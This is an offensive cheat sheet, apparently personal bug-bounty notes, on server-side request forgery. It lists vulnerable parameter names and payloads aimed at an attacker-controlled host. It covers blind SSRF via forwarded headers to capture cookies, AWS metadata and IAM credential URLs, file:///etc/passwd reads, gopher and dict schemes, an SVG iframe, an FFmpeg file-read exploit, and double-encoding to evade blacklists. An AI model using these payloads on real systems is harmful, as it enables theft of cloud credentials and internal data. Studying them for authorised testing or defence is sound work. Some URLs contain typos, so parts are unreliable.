# SSRF

payload : `www.attacker.com/?`    <-- https://hackerone.com/reports/2442626

Use [[Certbot]] to make our http server to https to allow target website to ping our attacker hosted website.

SSRF via SVG file upload

Spider a domain in burpsuite. Payloads are at down
Search for `url=` `request=` `load=` `redirect=` `fetch=` `page=` `site=` `open=` `entry=` `target=` `Destination=` `Uri=` `file=`

### Blind SSRF

X-Forwarded-Host, X-Forwarded-For, X-HOST etc,

Add this header in the request followed by our attacker URL. 

it will send cookies, internal requests, IP. To our server.

SVG  `https://github.com/allanlw/svg-cheatsheet`

##### AWS Meta Data Service 
SSRF -> AWS Metadata Service
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
`<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>`
`<img src="file:///etc/passwd">`

```
http:// 169.254.169.254/latest/meta—data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta—data/iam/security-credentials/IAM_USER_ROLE_HERE
http://169.254.169.254/latest/meta-data/iam/security-credentialsl/PhotonInstance
```

SSRF to Accessing Cloud Meta Data 

https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b

##### SSRF to LFI 

`file://etc/passwd`

Double Encode URL to avoid black listing ()


---

### URL Schemes to Check 

```
file://
dict://
sftp://
ldap://
ldaps://
ldapi://
tfpt://
gopher://
```

### SSRF to XSS

Host a file in attacker server or any where publicly, give that to make an XSS. (the file will contain XSS payload).

### SSRF to FFMPEG

if any Video upload functionality is there in the website we can exploit this.

https://github.com/neex/ffmpeg-avi-m3u-xbin

`./gen_xbin_avi.py file://<filename> file_read.avi`

## Payloads

```
?dest={target} 
?redirect={target} 
?uri={target} 
?path={target} 
?continue={target} 
?url={target} 
?window={target} 
?next={target} 
?data={target} 
?reference={target} 
?site={target}
?html={target} 
?val={target} 
?validate={target} 
?domain={target} 
?callback={target} 
?return={target} 
?page={target} 
?feed={target} 
?host={target} 
?port={target} 
?to={target} 
?out={target} 
?view={target} 
?dir={target}
```